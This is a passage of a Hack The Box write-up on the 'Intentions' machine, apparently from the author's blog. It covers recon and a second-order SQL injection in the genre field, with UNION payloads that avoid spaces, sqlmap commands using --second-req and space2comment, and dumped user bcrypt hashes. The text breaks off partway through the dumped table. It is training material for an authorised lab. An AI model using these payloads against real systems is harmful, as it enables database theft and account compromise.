---
title: HTB: Intentions
url: https://0xdf.gitlab.io/2023/10/14/htb-intentions.html
date: 2023-10-14T13:45:00+00:00
difficulty: Hard [40]
os: Linux
tags: htb-intentions, ctf, hackthebox, nmap, ubuntu, php, laravel, feroxbuster, image-magick, sqli, second-order, second-order-sqli, sqli-union, sqli-no-spaces, sqlmap, sqlmap-second-order, ssrf, arbitrary-object-instantiation, msl, scheme, webshell, upload, git, capabilities, bruteforce, python, youtube, file-read, htb-extension, htb-earlyaccess, htb-nightmare, oscp-like-v3
---

![Intentions](/img/intentions-cover.png)

Intentions starts with a website where I’ll find and exploit a second order SQL injection to leak admin hashes. I’ll find a version of the login form that hashes client-side and send the hash to get access as admin. As admin, I have access to new features to modify images. I’ll identify this is using ImageMagick, and abuse arbitrary object instantiation to write a webshell. With a foothold, I’ll find credentials in an old Git commit, and pivot to the next user. This user can run a hashing program as root to look for copywritten material. I’ll abuse it’s ability to specify a length to give myself file read as root by brute-forcing one byte at a time. In Beyond Root, I’ll look at some oddities of the file scanner.

## Box Info

| Name | [Intentions](https://hackthebox.com/machines/intentions)  [Intentions](https://hackthebox.com/machines/intentions) [Play on HackTheBox](https://hackthebox.com/machines/intentions) |
| --- | --- |
| Release Date | [01 Jul 2023](https://twitter.com/hackthebox_eu/status/1674417534702080001) |
| Retire Date | 14 Oct 2023 |
| OS | Linux Linux |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for Intentions |
| Radar Graph | Radar chart for Intentions |
| First Blood User | 04:32:07[Palermo Palermo](https://app.hackthebox.com/users/131751) |
| First Blood Root | 06:06:35[Bottom85 Bottom85](https://app.hackthebox.com/users/1059047) |
| Creator | [htbas9du htbas9du](https://app.hackthebox.com/users/388108) |

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.220
Starting Nmap 7.80 ( https://nmap.org ) at 2023-09-14 13:37 EDT
Nmap scan report for 10.10.11.220
Host is up (0.090s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 6.95 seconds
oxdf@hacky$ nmap -p 22,80 -sCV 10.10.11.220
Starting Nmap 7.80 ( https://nmap.org ) at 2023-09-14 13:38 EDT
Nmap scan report for 10.10.11.220
Host is up (0.090s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Intentions
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.35 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) version, the host is likely running Ubuntu 22.04 jammy.

### Website - TCP 80

#### Site - Unauthed

The website is for the “Intentions Image Gallery”, and the web root presents a login form:

![image-20230914133954040](/img/image-20230914133954040.png)

After a couple quick checks for basic SQL injection and default creds, I’ll go to the register link, where it offers a form to create an account, which I’ll fill in:

![image-20230914141439421](/img/image-20230914141439421.png)

#### Site - Authed

On logging in, there’s a welcome message. On the Gallery tab, there are images, each with a genre:

![image-20230914141832915](/img/image-20230914141832915.png)

“Your Feed” shows the same pictures, limited to the genres set in my profile, which looks like:

![image-20230914141955493](/img/image-20230914141955493.png)

I can change the genres and click update, and the images in “Your Feed” reflect the change.

#### Tech Stack

The HTTP response headers from my initial visit to the page don’t explicitly show any info about the framework:

```

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Content-Type: text/html; charset=UTF-8
Connection: close
Cache-Control: no-cache, private
Date: Thu, 14 Sep 2023 17:39:19 GMT
Set-Cookie: XSRF-TOKEN=eyJpdiI6InIvbjN3ay96bFJnTE9GcDFjMWRxa1E9PSIsInZhbHVlIjoid0JJZkxjWXVRZEp3YzFPcE1hYUNyZ1RDajA4WEdBbUl3V3U3THZabW1QWERZQS9scFVGMDRnVEJtaCtENW5sWktYS3FzNURya3JnakJjZ3Jaa2c4UmJzZGw3cXdTanVUVVlsMFE2bUtjUVBOeXBXR1FBamZCNUdRTUx4VDBCNzEiLCJtYWMiOiJiMjVmYjI5NDdlMTg2MTY0ZTE3MDk2ZjNhYTgzNDc0MjNkZjkzMmRjOGUyODFiMmFmMGY0MDgxYTY2MDA2MjEzIiwidGFnIjoiIn0%3D; expires=Thu, 14-Sep-2023 19:39:19 GMT; Max-Age=7200; path=/; samesite=lax
Set-Cookie: intentions_session=eyJpdiI6IkhsUDYzbDJmQ0tLek5uM3haNFA0VlE9PSIsInZhbHVlIjoiMFRzV3F3ZVZOUldwc0p2aE93dDQwZkdNa0N0bm8wT0RPcUUwczVTdHNqZUs2WUpJWXBUSHRZNVVvT1pJVG0yeXVoUDQvUnhLRms3V1NtRkdBV214Mk1ZYXR2T2hxZ3dBTmhqbExZSzJkcmZNeng2cmgrd3BCeTJPdkZSUVptUk4iLCJtYWMiOiI4ODdiZDc1M2QyOWM5Y2M5OTlmMjNmMmE0MjlhNzExODYyMmMxZDQzMWE0MDMzNzQ5ZDViNzQ0NWNmNjNhMjg3IiwidGFnIjoiIn0%3D; expires=Thu, 14-Sep-2023 19:39:19 GMT; Max-Age=7200; path=/; httponly; samesite=lax
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
Content-Length: 1523

```

That said, the two cookies that get set, `XSRF-TOKEN` and `intentions_session`, match the typical format seen from the [Laravel PHP framework](https://laravel.com/). The session cookie can be `laravel_session` (like in [Extension](/2023/03/18/htb-extension.html#tech-stack)), or renamed to match the app (like in [EarlyAccess](/2022/02/12/htb-earlyaccess.html#tech-stack)).

Corroborating this theory, visiting `/index.php` loads the same login page, and visiting a page that doesn’t exist shows the Laravel 404 page:

![image-20230914134703031](/img/image-20230914134703031.png)

I’ll note that each of the image files are stored in `/storage/[category]/`, where `[category]` is a word such as “nature”, “food”, etc.

Digging around in the HTML source, I don’t find any additional hints about the framework, but there are two interesting includes that stand out:

[![image-20230914145557519](/img/image-20230914145557519.png)*Click for full size image*](/img/image-20230914145557519.png)

Both these files are heavily obfuscated. I can come back to them and try to deobfuscate them if necessary, but it won’t be.

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x php` since I know the site is PHP:

```

oxdf@hacky$ feroxbuster -u http://10.10.11.220 -x php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.220
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       36l      123w     6609c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        7l       10w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        1l        3w       16c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        7l       12w      178c http://10.10.11.220/css => http://10.10.11.220/css/
301      GET        7l       12w      178c http://10.10.11.220/js => http://10.10.11.220/js/
200      GET       39l       94w     1523c http://10.10.11.220/
302      GET       12l       22w      322c http://10.10.11.220/logout => http://10.10.11.220
302      GET       12l       22w      322c http://10.10.11.220/admin => http://10.10.11.220
302      GET       12l       22w      322c http://10.10.11.220/gallery => http://10.10.11.220
200      GET       39l       94w     1523c http://10.10.11.220/index.php
301      GET        7l       12w      178c http://10.10.11.220/fonts => http://10.10.11.220/fonts/
301      GET        7l       12w      178c http://10.10.11.220/storage => http://10.10.11.220/storage/
301      GET        7l       12w      178c http://10.10.11.220/fonts/vendor => http://10.10.11.220/fonts/vendor/
301      GET        7l       12w      178c http://10.10.11.220/storage/food => http://10.10.11.220/storage/food/
301      GET        7l       12w      178c http://10.10.11.220/storage/animals => http://10.10.11.220/storage/animals/
301      GET        7l       12w      178c http://10.10.11.220/storage/nature => http://10.10.11.220/storage/nature/
301      GET        7l       12w      178c http://10.10.11.220/storage/architecture => http://10.10.11.220/storage/architecture/
[####################] - 39m   300000/300000  0s      found:14      errors:1      
[####################] - 35m    30000/30000   14/s    http://10.10.11.220/ 
[####################] - 35m    30000/30000   14/s    http://10.10.11.220/css/ 
[####################] - 35m    30000/30000   14/s    http://10.10.11.220/js/ 
[####################] - 35m    30000/30000   14/s    http://10.10.11.220/fonts/ 
[####################] - 35m    30000/30000   13/s    http://10.10.11.220/storage/ 
[####################] - 36m    30000/30000   13/s    http://10.10.11.220/fonts/vendor/ 
[####################] - 35m    30000/30000   13/s    http://10.10.11.220/storage/food/ 
[####################] - 33m    30000/30000   14/s    http://10.10.11.220/storage/animals/ 
[####################] - 33m    30000/30000   15/s    http://10.10.11.220/storage/nature/ 
[####################] - 30m    30000/30000   16/s    http://10.10.11.220/storage/architecture/ 

```

`/admin` is interesting, but it returns a 302 redirect to the login page.

I’ll eventually come back and think about the interesting obfuscated JavaScript includes. It’s worth looking for any additional files that might be in `/js/`:

```

oxdf@hacky$ feroxbuster -u http://10.10.11.220/js -x js

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.220/js
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [js]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        7l       10w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET       36l      123w     6609c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        7l       12w      178c http://10.10.11.220/js => http://10.10.11.220/js/
200      GET        2l     5429w   279176c http://10.10.11.220/js/login.js
200      GET        2l     6382w   311246c http://10.10.11.220/js/admin.js
200      GET        2l     7687w   433792c http://10.10.11.220/js/app.js
200      GET        2l     6188w   310841c http://10.10.11.220/js/gallery.js
200      GET        2l     2249w   153684c http://10.10.11.220/js/mdb.js
[####################] - 7m     30000/30000   0s      found:6       errors:0
[####################] - 7m     30000/30000   68/s    http://10.10.11.220/js/ 

```

#### admin.js

The most interesting one is `admin.js`. It too is heavily obfuscated, but there are some JSON objects at the bottom that have clear text strings:

![image-20230914150140319](/img/image-20230914150140319.png)

The important bit of info is:

> Hey team, I’ve deployed the v2 API to production and have started using it in the admin section. Let me know if you spot any bugs.
>
> ​ This will be a major security upgrade for our users, passwords no longer need to be transmitted to the server in clear text!
>
> ​ By hashing the password client side there is no risk to our users as BCrypt is basically uncrackable.
>
> ​ This should take care of the concerns raised by our users regarding our lack of HTTPS connection.
>
> The v2 API also comes with some neat features we are testing that could allow users to apply cool effects to the images. I’ve included some examples on the image editing page, but feel free to browse all of the available effects for the module and suggest some

My attempts to login via the site are POST requests to `/api/v1/login` with my username and password in plain text.

It’s also worth noting for later that just below these messages, there’s a reference to `imagick.php`:

![image-20230914172646785](/img/image-20230914172646785.png)

## Shell as www-data

### SQL Injection [Manual]

#### Playing with Your Feed / Genres

I’ll play around a bit with the “Favorite Genres” input to see how it works. The default value is “food,travel,nature”. On changing it to “food,travel”, only food and travel images show up in the “Your Feed”. If I add a space to make it “food, travel”, the space seems to break things as only food images show.

Looking at the requests in Burp Proxy, visiting “Your Feed” issues a GET request to `/api/v1/gallery/user/feed`. The response is a JSON object with metadata about a list of images (including the full URL to that image):

[![image-20230914151310857](/img/image-20230914151310857.png)*Click for full size image*](/img/image-20230914151310857.png)

If I set the genres to “0xdf”, then no images return. The HTTP response shows success, but with an empty list:

```

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Content-Type: application/json
Connection: close
Cache-Control: no-cache, private
Date: Thu, 14 Sep 2023 19:13:30 GMT
X-RateLimit-Limit: 3600
X-RateLimit-Remaining: 3597
Access-Control-Allow-Origin: *
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
Content-Length: 30

{"status":"success","data":[]}

```

#### Crash

On seeing the gallery, it’s worth thinking about how the page works. The most complicated part would be how to generate the “Your Feed” section. It needs to get the user’s profile (presumably from a database), use the genres string to make a database query for images, splitting it on “,” and then building that query.

It seems like a reasonable place to check for SQL injection. I’ll change the genres to include a single quote. It saves just fine:

![image-20230914151036374](/img/image-20230914151036374.png)

However, there are no images at “Your Feed”. Looking at the request, it’s a 500 error:

```

HTTP/1.1 500 Internal Server Error
Server: nginx/1.18.0 (Ubuntu)
Content-Type: application/json
Connection: close
Cache-Control: no-cache, private
Date: Thu, 14 Sep 2023 19:14:20 GMT
Content-Length: 33

{
    "message": "Server Error"
}

```

That’s a good sign that there’s an injection here.

#### Fix Injection Query

To get a working injection, I’ll try to “fix” the injection query to get it working again while still having my injection. A simple first guess is setting genres to something like `food,' or 1=1-- -`. this still returns a 500 error.

The SQL query running on the server must look something like:

```

SELECT * from images WHERE genre IN ('genre1', 'genre2', 'genre3')

```

If that’s the case, then I would want my input to close both the single quote as well as the parenthesis, with something like `food,') or 1=1;-- -`. That still errors.

I already noted above that having a space in the query might have been messing something up. Without knowing what it’s doing, I can try using comments instead of spaces, like this:

```

food')/**/or/**/1=1#

```

It’s important to switch from the `-- -` comment to `#`, as the former requires a space to make the comment, and I’m testing without spaces (`--/**/-` will not work).

With my genres set to that, “Your Feed” populates with images of genre animal, architecture, feed, nature, etc. This is successful injection, and it’s a second-order SQL injection because the query to one page that sets the injection is then manifested on another page when viewed.

#### Number of Columns

To do a UNION injection, I’ll need to know the number of columns naturally returned from the query so I can UNION on that same number of columns of data to leak.

I’ll see from the data returned above that each image has at least six things returned (`id`, `file`, `genre`, `created_at`, `udpated_at`, and `url`), through `url` could be generated from `file`, so maybe only five items. I’ll try five like this: `')/**/UNION/**/SELECT/**/1,2,3,4,5#`.

In Repeater, I’ll request the feed, and it returns exactly what I’m hoping for:

```

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Content-Type: application/json
Connection: close
Cache-Control: no-cache, private
Date: Thu, 14 Sep 2023 19:27:29 GMT
X-RateLimit-Limit: 3600
X-RateLimit-Remaining: 3594
Access-Control-Allow-Origin: *
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
Content-Length: 168

{
  "status":"success",
  "data":[
    {
      "id":1,
      "file":"2",
      "genre":"3",
      "created_at":"1970-01-01T00:00:04.000000Z",
      "updated_at":"1970-01-01T00:00:05.000000Z",
      "url":"\/storage\/2"
    }
  ]
}

```

The input numbers one through five are in each of these columns, and the `url` is built from the `file` (as guessed).

#### Database Enumeration

Now I can use that template to make queries into the database. Where I have “2” and “3” are the only things that can take strings, so I’ll focus there. If I replace “2” with “user()” and “3” with “database()”, it shows the results:

```

{
    "status":"success",
    "data":[
        {
            "id":10,
            "file":"laravel@localhost",
         	"genre":"intentions",
         	"created_at":"1970-01-01T00:00:04.000000Z",
         	"updated_at":"1970-01-01T00:00:05.000000Z",
         	"url":"\/storage\/laravel@localhost"
        }
    ]
}

```

The user is laravel@localhost, and the database is intentions. I’ll use `version()` to get the version of 10.6.12-MariaDB-0ubuntu0.22.04.1.

I’ll change genres to get the list of databases and tables:

```

')/**/UNION/**/SELECT/**/1,table_schema,table_name,4,5/**/from/**/information_schema.tables/**/where/**/table_schema/**/!=/**/'information_schema'#

```

This will get the database name in the `file` and the table name in the `genre` of the output, and it will skip tables in the information\_schema table (as those are standard and well defined). It returns:

```

{
    "status":"success",
    "data":[
        {
            "id":1,
            "file":"intentions",
            "genre":"gallery_images",
            "created_at":"1970-01-01T00:00:04.000000Z",
            "updated_at":"1970-01-01T00:00:05.000000Z",
            "url":"\/storage\/intentions"
        },
        {
            "id":1,
            "file":"intentions",
            "genre":"personal_access_tokens",
            "created_at":"1970-01-01T00:00:04.000000Z",
            "updated_at":"1970-01-01T00:00:05.000000Z",
            "url":"\/storage\/intentions"
        },
        {
            "id":1,
            "file":"intentions",
            "genre":"migrations",
            "created_at":"1970-01-01T00:00:04.000000Z",
            "updated_at":"1970-01-01T00:00:05.000000Z",
            "url":"\/storage\/intentions"
        },
        {
            "id":1,
            "file":"intentions",
            "genre":"users",
            "created_at":"1970-01-01T00:00:04.000000Z",
            "updated_at":"1970-01-01T00:00:05.000000Z",
            "url":"\/storage\/intentions"
        }
    ]
}

```

The only database is `intentions`, and there are four tables: `gallery_images`, `personal_access_tokens`, `migrations`, and `users`.

The most immediately interesting table is `users`. I’ll update my genres to list the columns in that table:

```

')/**/UNION/**/SELECT/**/1,2,column_name,4,5/**/from/**/information_schema.columns/**/where/**/table_name='users'#

```

This returns `id`, `name`, `email`, `password`, `created_at`, `updated_at`, and `genres`. I’ll update my query to get all of the interesting information in one column using `concat`:

```

')/**/UNION/**/SELECT/**/1,2,concat(name,':',email,':',admin,':',password,':',genres),4,5/**/from/**/users#

```

I get the following users:

```

steve:steve@intentions.htb:1:$2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa:food,travel,nature
greg:greg@intentions.htb:1:$2y$10$95OR7nHSkYuFUUxsT1KS6uoQ93aufmrpknz4jwRqzIbsUpRiiyU5m:food,travel,nature
Melisa Runolfsson:hettie.rutherford@example.org:0:$2y$10$bymjBxAEluQZEc1O7r1h3OdmlHJpTFJ6CqL1x2ZfQ3paSf509bUJ6:food,travel,nature
Camren Ullrich:nader.alva@example.org:0:$2y$10$WkBf7NFjzE5GI5SP7hB5/uA9Bi/BmoNFIUfhBye4gUql/JIc/GTE2:food,travel,nature
Mr. Lucius Towne I:jones.laury@example.com:0:$2y$10$JembrsnTWIgDZH3vFo1qT.Zf/hbphiPj1vGdVMXCk56icvD6mn/ae:food,travel,nature
Jasen Mosciski:wanda93@example.org:0:$2y$10$oKGH6f8KdEblk6hzkqa2meqyDeiy5gOSSfMeygzoFJ9d1eqgiD2rW:food,travel,nature
Monique D'Amore:mwisoky@example.org:0:$2y$10$pAMvp3xPODhnm38lnbwPYuZN0B/0nnHyTSMf1pbEoz6Ghjq.ecA7.:food,travel,nature
Desmond Greenfelder:lura.zieme@example.org:0:$2y$10$.VfxnlYhad5YPvanmSt3L.5tGaTa4/dXv1jnfBVCpaR2h.SDDioy2:food,travel,nature
Mrs. Roxanne Raynor:pouros.marcus@example.net:0:$2y$10$UD1HYmPNuqsWXwhyXSW2d.CawOv1C8QZknUBRgg3/Kx82hjqbJFMO:food,travel,nature
Rose Rutherford:mellie.okon@example.com:0:$2y$10$4nxh9pJV0HmqEdq9sKRjKuHshmloVH1eH0mSBMzfzx/kpO/XcKw1m:food,travel,nature
Dr. Chelsie Greenholt I:trace94@example.net:0:$2y$10$by.sn.tdh2V1swiDijAZpe1bUpfQr6ZjNUIkug8LSdR2ZVdS9bR7W:food,travel,nature
Prof. Johanna Ullrich MD:kayleigh18@example.com:0:$2y$10$9Yf1zb0jwxqeSnzS9CymsevVGLWIDYI4fQRF5704bMN8Vd4vkvvHi:food,travel,nature
Prof. Gina Brekke:tdach@example.com:0:$2y$10$UnvH8xiHiZa.wryeO1O5IuARzkwbFogWqE7x74O1we9HYspsv9b2.:food,travel,nature
Jarrett Bayer:lindsey.muller@example.org:0:$2y$10$yUpaabSbUpbfNIDzvXUrn.1O8I6LbxuK63GqzrWOyEt8DRd0ljyKS:food,travel,nature
Macy Walter:tschmidt@example.org:0:$2y$10$01SOJhuW9WzULsWQHspsde3vVKt6VwNADSWY45Ji33lKn7sSvIxIm:food,travel,nature
Prof. Devan Ortiz DDS:murray.marilie@example.com:0:$2y$10$I7I4W5pfcLwu3O/wJwAeJ.xqukO924Tx6WHz1am.PtEXFiFhZUd9S:food,travel,nature
Eula Shields:barbara.goodwin@example.com:0:$2y$10$0fkHzVJ7paAx0rYErFAtA.2MpKY/ny1.kp/qFzU22t0aBNJHEMkg2:food,travel,nature
Mariano Corwin:maggio.lonny@example.org:0:$2y$10$p.QL52DVRRHvSM121QCIFOJnAHuVPG5gJDB/N2/lf76YTn1FQGiya:food,travel,nature
Madisyn Reinger DDS:chackett@example.org:0:$2y$10$GDyg.hs4VqBhGlCBFb5dDO6Y0bwb87CPmgFLubYEdHLDXZVyn3lUW:food,travel,nature
Jayson Strosin:layla.swift@example.net:0:$2y$10$Gy9v3MDkk5cWO40.H6sJ5uwYJCAlzxf/OhpXbkklsHoLdA8aVt3Ei:food,travel,nature
Zelda Jenkins:rshanahan@example.net:0:$2y$10$/2wLaoWygrWELes242Cq6Ol3UUx5MmZ31Eqq91Kgm2O8S.39cv9L2:food,travel,nature
Eugene Okuneva I:shyatt@example.com:0:$2y$10$k/yUU3iPYEvQRBetaF6GpuxAwapReAPUU8Kd1C0Iygu.JQ/Cllvgy:food,travel,nature
Mrs. Rhianna Hahn DDS:sierra.russel@example.com:0:$2y$10$0aYgz4DMuXe1gm5/aT.gTe0kgiEKO1xf/7ank4EW1s6ISt1Khs8Ma:food,travel,nature
Viola Vandervort DVM:ferry.erling@example.com:0:$2y$10$iGDL/XqpsqG.uu875Sp2XOaczC6A3GfO5eOz1kL1k5GMVZMipZPpa:food,travel,nature
Prof. Margret Von Jr.:beryl68@example.org:0:$2y$10$stXFuM4ct/eKhUfu09JCVOXCTOQLhDQ4CFjlIstypyRUGazqmNpCa:food,travel,nature
Florence Crona:ellie.moore@example.net:0:$2y$10$NDW.r.M5zfl8yDT6rJTcjemJb0YzrJ6gl6tN.iohUugld3EZQZkQy:food,travel,nature
Tod Casper:littel.blair@example.org:0:$2y$10$S5pjACbhVo9SGO4Be8hQY.Rn87sg10BTQErH3tChanxipQOe9l7Ou:food,travel,nature
0xdf:0xdf@intentions.htb:0:$2y$10$YUmJGH/nZwMGYmrz.TqDHOtpq1VK4xrw87YtsEJhaobmQ23pY7AbW:')/**/UNION/**/SELECT/**/1,2,concat(name,':',email,':',password,':',genres),4,5/**/from/**/users#

```

I’ll note the top two, steve and greg, have the “admin” attribute set to 1.

### SQL Injection [sqlmap]

#### Identify

I’ve shown exploiting a complicated second-order SQL injection with `sqlmap` before, five years ago in [Nightmare](/2018/07/07/second-order-sql-injection-on-htb-nightmare.html#nightmare-sqli-with-sqlmap).

I can do all the steps above with `sqlmap`. I’ll need a couple things:
- Save request setting genres without any injection and only a single genre to a file, `genres.request`.
- Save a request fetching the user feed to a file, `feed.request`.

I’ll do this in Burp by right clicking and selecting “Copy to file”. This is preferred over giving it the URL because then the cookies and other headers will match.

The `sqlmap` syntax has updated over the last five years since Nightmare. `--second-order` is deprecated in favor of `--second-req`. I’ll give it `--tamper=space2comment` (sqlmap will fail without this for the reasons seen above, but it will also suggest trying this tamper). I’ll also give it `--technique=U` to limit to union injections. It will find the union without this, but it’ll go faster since I know this is possible. I will need to increase the `--level 5`, which is the max. With all of this, it finds the injection:

```

oxdf@hacky$ sqlmap -r genres.request --second-req feed.request --batch --tamper=space2comment --technique=U --level 5
...[snip]...
[16:39:51] [INFO] parsing HTTP request from 'genres.request'
[16:39:51] [INFO] parsing second-order HTTP request from 'feed.request'
[16:39:51] [INFO] loading tamper module 'space2comment'
JSON data found in POST body. Do you want to process it? [Y/n/q] Y
Cookie parameter 'XSRF-TOKEN' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
Cookie parameter 'token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
[16:39:51] [INFO] testing connection to the target URL
[16:39:51] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS
[16:39:51] [WARNING] heuristic (basic) test shows that (custom) POST parameter 'JSON genres' might not be injectable
[16:39:52] [INFO] testing for SQL injection on (custom) POST parameter 'JSON genres'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[16:39:52] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[16:40:00] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[16:40:08] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
[16:40:09] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[16:40:10] [INFO] target URL appears to have 5 columns in query
[16:40:10] [INFO] (custom) POST parameter 'JSON genres' is 'MySQL UNION query (NULL) - 1 to 10 columns' injectable
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided risk (1) value? [Y/n] Y
(custom) POST parameter 'JSON genres' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 85 HTTP(s) requests:
---
Parameter: JSON genres ((custom) POST)
    Type: UNION query
    Title: MySQL UNION query (NULL) - 5 columns
    Payload: {"genres":"food') UNION ALL SELECT NULL,NULL,CONCAT(0x71786a6271,0x494a62554f746d6d4c4e6a516167514a717443754e775069554a4c62424959456f535751634d7668,0x7171706271),NULL,NULL#"}
---
[16:40:10] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[16:40:10] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL Unknown (MariaDB fork)
[16:40:11] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 35 times
[16:40:11] [INFO] fetched data logged to text files under '/home/oxdf/.local/share/sqlmap/output/10.10.11.220'

```

#### Enumerate

I’ll add `--dbs` to the end and it prints the two db names:

```

oxdf@hacky$ sqlmap -r genres.request --second-req feed.request --batch --tamper=space2comment --technique=U --level 5 --dbs
...[snip]...
[16:43:51] [INFO] fetching database names
available databases [2]:
[*] information_schema
[*] intentions
...[snip]...

```

Replacing `--dbs` with `-D intentions --tables` will list the tables in `intentions`:

```

oxdf@hacky$ sqlmap -r genres.request --second-req feed.request --batch --tamper=space2comment --technique=U --level 5 -D intentions --tables
...[snip]...
[16:44:50] [INFO] fetching tables for database: 'intentions'
Database: intentions
[4 tables]
+------------------------+
| gallery_images         |
| migrations             |
| personal_access_tokens |
| users                  |
+------------------------+
...[snip]...

```

Replacing `--tables` with `-T users --dump` will dump that table:

```

oxdf@hacky$ sqlmap -r genres.request --second-req feed.request --batch --tamper=space2comment --technique=U --level 5 -D intentions -T users --dump                              
...[snip]...
Database: intentions
Table: users
[28 entries]
+----+-------------------------------+--------------------------+--------------------------------+---------+--------------------------------------------------------------+---------------------+---------------------+
| id | email                         | name                     | genres                         | admin   | password                                                     | created_at          | updated_at          |
+----+-------------------------------+--------------------------+--------------------------------+---------+--------------------------------------------------------------+---------------------+---------------------+
| 1  | steve@intentions.htb          | steve                    | food,travel,nature             | 1       | $2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa | 2023-02-02 17:43:00 | 2023-02-02 17:43:00 |
| 2  | greg@intentions.htb           | greg                     | food,travel,nature             | 1       | $2y$10$95OR7nHSkYuFUUxsT1KS6uoQ93aufmrpknz4jwRqzIbsUpRiiyU5m | 2023-02-02 17:44:11 | 2023-02-02 17:44:11 |
| 3  | hettie.rutherford@example.org | Melisa Runolfsson        | food,travel,nature             | 0       | $2y$10$bymjBxAEluQZEc1O7r1h3OdmlHJpTFJ6CqL1x2ZfQ3paSf509bUJ6 | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 4  | nader.alva@example.org        | Camren Ullrich           | food,travel,nature             | 0       | $2y$10$WkBf7NFjzE5GI5SP7hB5/uA9Bi/BmoNFIUfhBye4gUql/JIc/GTE2 | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 5  | jones.laury@example.com       | Mr. Lucius Towne I       | food,travel,nature             | 0       | $2y$10$JembrsnTWIgDZH3vFo1qT.Zf/hbphiPj1vGdVMXCk56icvD6mn/ae | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 6  | wanda93@example.org           | Jasen Mosciski           | food,travel,nature             | 0       | $2y$10$oKGH6f8KdEblk6hzkqa2meqyDeiy5gOSSfMeygzoFJ9d1eqgiD2rW | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
| 7  | mwisoky@example.org           | Monique D'Amore          | food,travel,nature             | 0       | $2y$10$pAMvp3xPODhnm38lnbwPYuZN0B/0nnHyTSMf1pbEoz6Ghjq.ecA7. | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
